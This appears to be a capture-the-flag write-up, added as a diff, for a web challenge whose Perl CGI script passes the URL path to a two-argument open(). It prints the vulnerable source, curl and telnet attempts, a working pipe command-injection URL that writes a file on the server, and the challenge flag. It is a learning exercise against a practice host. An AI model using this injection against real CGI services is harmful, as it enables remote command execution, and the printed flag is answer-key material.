@@ -1,0 +1,367 @@
+## There is a directory list
+
+http://ctfq.sweetduet.info:10080/~q26/
+
+[TXT]	a_scandal_in_bohemia_1.txt	05-Apr-2016 22:40	19K	 
+[TXT]	a_scandal_in_bohemia_2.txt	05-Apr-2016 22:40	21K	 
+[TXT]	a_scandal_in_bohemia_3.txt	05-Apr-2016 22:40	5.9K	 
+[TXT]	flag.txt	05-Apr-2016 22:40	58	 
+[   ]	index.pl	05-Apr-2016 22:40	1.0K	 
+
+I have no access to any of txt files(403 Forbidden)
+
+## server info
+
+# curl -I http://ctfq.sweetduet.info:10080/~q26/
+HTTP/1.1 200 OK
+Date: Tue, 05 Apr 2016 14:03:30 GMT
+Server: Apache/2.2.15 (CentOS)
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+## I can access the file from below URL
+http://ctfq.sweetduet.info:10080/~q26/index.pl/a_scandal_in_bohemia_1.txt
+
+## I can't access the file from below URL
+http://ctfq.sweetduet.info:10080/~q26/a_scandal_in_bohemia_1.txt
+
+## index.pl appears to be the perl cgi script
+
+## I can access to the flag.txt from below URL
+http://ctfq.sweetduet.info:10080/~q26/index.pl/flag.txt
+
+## There was a hint
+
+FROG_CroakCroak
+
+How about to try to see the source code?
+
+## Let's try to read the source code of index.pl
+
+http://ctfq.sweetduet.info:10080/~q26/index.pl/index.pl
+
+## source code of index.pl
+
+#!/usr/bin/perl
+use CGI;
+
+print <<'EOS';
+Content-type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>A SCANDAL IN BOHEMIA</title>
+</head>
+<body>
+<h1>A SCANDAL IN BOHEMIA</h1>
+<div>
+<a href="/~q26/index.pl/a_scandal_in_bohemia_1.txt">A SCANDAL IN BOHEMIA I</a>&nbsp;
+<a href="/~q26/index.pl/a_scandal_in_bohemia_2.txt">A SCANDAL IN BOHEMIA II</a>&nbsp;
+<a href="/~q26/index.pl/a_scandal_in_bohemia_3.txt">A SCANDAL IN BOHEMIA III</a>&nbsp;
+</div>
+<hr>
+<div>
+EOS
+
+
+
+# Can you crack me? :P
+open(F,'cracked.txt');
+my $t = <F>;
+chomp($t);
+if ($t eq 'h@ck3d!') {
+print 'FLAG_****************<br><br>';
+}
+unlink('cracked.txt');
+####
+
+
+
+open(F,substr($ENV{'PATH_INFO'},1));
+
+my $cgi = new CGI;
+$cgi->charset('utf-8');
+while(<F>) {
+chomp;
+s/FLAG_\w+/FLAG_****************/g;
+print $cgi->escapeHTML($_)."<br>\n";
+}
+
+print <<'EOS';
+</div>
+<hr>
+<address>
+http://www.gutenberg.org/files/1661/1661-h/1661-h.htm
+</address>
+</body>
+</html>
+EOS
+
+## Save the perl script as "crack.cgi" and move it to document root of apache.
+perl crack.cgi
+
+## I somehow have to upload "cracked.txt" to remote server and and let index.pl to read that txt
+
+# curl -i http://ctfq.sweetduet.info:10080/~q26/
+HTTP/1.1 200 OK
+Date: Wed, 06 Apr 2016 14:58:58 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 1795
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /~q26</title>
+ </head>
+ <body>
+<h1>Index of /~q26</h1>
+<table><tr><th><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr><tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[DIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="a_scandal_in_bohemia_1.txt">a_scandal_in_bohemia_1.txt</a></td><td align="right">06-Apr-2016 23:50  </td><td align="right"> 19K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="a_scandal_in_bohemia_2.txt">a_scandal_in_bohemia_2.txt</a></td><td align="right">06-Apr-2016 23:50  </td><td align="right"> 21K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="a_scandal_in_bohemia_3.txt">a_scandal_in_bohemia_3.txt</a></td><td align="right">06-Apr-2016 23:50  </td><td align="right">5.9K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="flag.txt">flag.txt</a></td><td align="right">06-Apr-2016 23:50  </td><td align="right"> 58 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/p.gif" alt="[   ]"></td><td><a href="index.pl">index.pl</a></td><td align="right">06-Apr-2016 23:50  </td><td align="right">1.0K</td><td>&nbsp;</td></tr>
+<tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.2.15 (CentOS) Server at ctfq.sweetduet.info Port 10080</address>
+</body></html>
+
+http://ctfq.sweetduet.info:10080/~q26/?C=N;O=D
+http://ctfq.sweetduet.info:10080/~q26/?C=M;O=A
+http://ctfq.sweetduet.info:10080/~q26/?C=S;O=A
+http://ctfq.sweetduet.info:10080/~q26/?C=D;O=A
+
+
+# curl -i http://ctfq.sweetduet.info:10080/~q26/index.pl/../flag.txt
+HTTP/1.1 403 Forbidden
+Date: Wed, 06 Apr 2016 16:01:55 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 303
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access /~q26/flag.txt
+on this server.</p>
+<hr>
+<address>Apache/2.2.15 (CentOS) Server at ctfq.sweetduet.info Port 10080</address>
+</body></html>
+
+# curl -i http://ctfq.sweetduet.info:10080/~q26/index.pl/../../flag.txt
+HTTP/1.1 404 Not Found
+Date: Wed, 06 Apr 2016 16:03:35 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 294
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /flag.txt was not found on this server.</p>
+<hr>
+<address>Apache/2.2.15 (CentOS) Server at ctfq.sweetduet.info Port 10080</address>
+</body></html>
+
+# curl -i http://ctfq.sweetduet.info:10080/~q26/index.pl/../cracked.txt
+HTTP/1.1 404 Not Found
+Date: Wed, 06 Apr 2016 16:04:15 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 302
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /~q26/cracked.txt was not found on this server.</p>
+<hr>
+<address>Apache/2.2.15 (CentOS) Server at ctfq.sweetduet.info Port 10080</address>
+</body></html>
+
+# curl -d "h@ck3d\!" -H "Content-Length: 7" http://ctfq.sweetduet.info:10080/~q26/index.pl/cracked.txt
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>A SCANDAL IN BOHEMIA</title>
+  </head>
+  <body>
+    <h1>A SCANDAL IN BOHEMIA</h1>
+    <div>
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_1.txt">A SCANDAL IN BOHEMIA I</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_2.txt">A SCANDAL IN BOHEMIA II</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_3.txt">A SCANDAL IN BOHEMIA III</a>&nbsp;
+    </div>
+    <hr>
+    <div>
+    </div>
+    <hr>
+    <address>
+      http://www.gutenberg.org/files/1661/1661-h/1661-h.htm
+    </address>
+  </body>
+</html>
+
+# telnet ctfq.sweetduet.info 10080
+Trying 49.212.153.157...
+Connected to ctfq.sweetduet.info.
+Escape character is '^]'.
+POST /~q26/index.pl/cracked.txt HTTP/1.1
+User-Agent: foobar
+Host: ctfq.sweetduet.info:10080
+Accept: */*
+Content-Length: 7
+Content-Type: text/html
+
+h@ck3d!
+
+HTTP/1.1 200 OK
+Date: Sat, 09 Apr 2016 11:45:44 GMT
+Server: Apache/2.2.15 (CentOS)
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+
+238
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>A SCANDAL IN BOHEMIA</title>
+  </head>
+  <body>
+    <h1>A SCANDAL IN BOHEMIA</h1>
+    <div>
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_1.txt">A SCANDAL IN BOHEMIA I</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_2.txt">A SCANDAL IN BOHEMIA II</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_3.txt">A SCANDAL IN BOHEMIA III</a>&nbsp;
+    </div>
+    <hr>
+    <div>
+    </div>
+    <hr>
+    <address>
+      http://www.gutenberg.org/files/1661/1661-h/1661-h.htm
+    </address>
+  </body>
+</html>
+
+0
+
+Connection closed by foreign host.
+
+]# telnet ctfq.sweetduet.info 10080
+Trying 49.212.153.157...
+Connected to ctfq.sweetduet.info.
+Escape character is '^]'.
+GET /~q26/index.pl/cracked.txt HTTP/1.1
+User-Agent: foobar
+Host: ctfq.sweetduet.info:10080
+Accept: */*
+Content-Length: 7
+Content-Type: text/html
+
+h@ck3d!
+
+HTTP/1.1 200 OK
+Date: Sat, 09 Apr 2016 11:51:30 GMT
+Server: Apache/2.2.15 (CentOS)
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+
+238
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>A SCANDAL IN BOHEMIA</title>
+  </head>
+  <body>
+    <h1>A SCANDAL IN BOHEMIA</h1>
+    <div>
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_1.txt">A SCANDAL IN BOHEMIA I</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_2.txt">A SCANDAL IN BOHEMIA II</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_3.txt">A SCANDAL IN BOHEMIA III</a>&nbsp;
+    </div>
+    <hr>
+    <div>
+    </div>
+    <hr>
+    <address>
+      http://www.gutenberg.org/files/1661/1661-h/1661-h.htm
+    </address>
+  </body>
+</html>
+
+0
+
+Connection closed by foreign host.
+
+## perl cgi vulnerability
+https://www.sans.org/security-resources/malwarefaq/guestbook.php
+
+## about perl open pipe vulnerability
+https://www.ipa.go.jp/security/awareness/vendor/programmingv1/a04_01.html
+
+
+## I can execute remote commands
+
+# curl -i http://ctfq.sweetduet.info:10080/~q26/index.pl/date%7C
+HTTP/1.1 200 OK
+Date: Sat, 09 Apr 2016 14:38:26 GMT
+Server: Apache/2.2.15 (CentOS)
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>A SCANDAL IN BOHEMIA</title>
+  </head>
+  <body>
+    <h1>A SCANDAL IN BOHEMIA</h1>
+    <div>
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_1.txt">A SCANDAL IN BOHEMIA I</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_2.txt">A SCANDAL IN BOHEMIA II</a>&nbsp;
+      <a href="/~q26/index.pl/a_scandal_in_bohemia_3.txt">A SCANDAL IN BOHEMIA III</a>&nbsp;
+    </div>
+    <hr>
+    <div>
+Sat Apr  9 23:38:42 JST 2016<br>
+    </div>
+    <hr>
+    <address>
+      http://www.gutenberg.org/files/1661/1661-h/1661-h.htm
+    </address>
+  </body>
+</html>
+
+echo h@ck3d! > cracked.txt;perl index.pl|
+
+echo h@ck3d! > ../cracked.txt;perl ../index.pl|
+
+
+## Flag
+FLAG_n6RBZdrXqrihS8se
+
+## Create "cracked.txt" contains string "h@ck3d!"
+echo h@ck3d! > cracked.txt|
+http://ctfq.sweetduet.info:10080/~q26/index.pl/echo%20h@ck3d!%20%3E%20cracked.txt%7C
+
+## Browse cracked.txt
+http://ctfq.sweetduet.info:10080/~q26/index.pl/cracked.txt
+
+## Flag will appear
+FLAG_n6RBZdrXqrihS8se
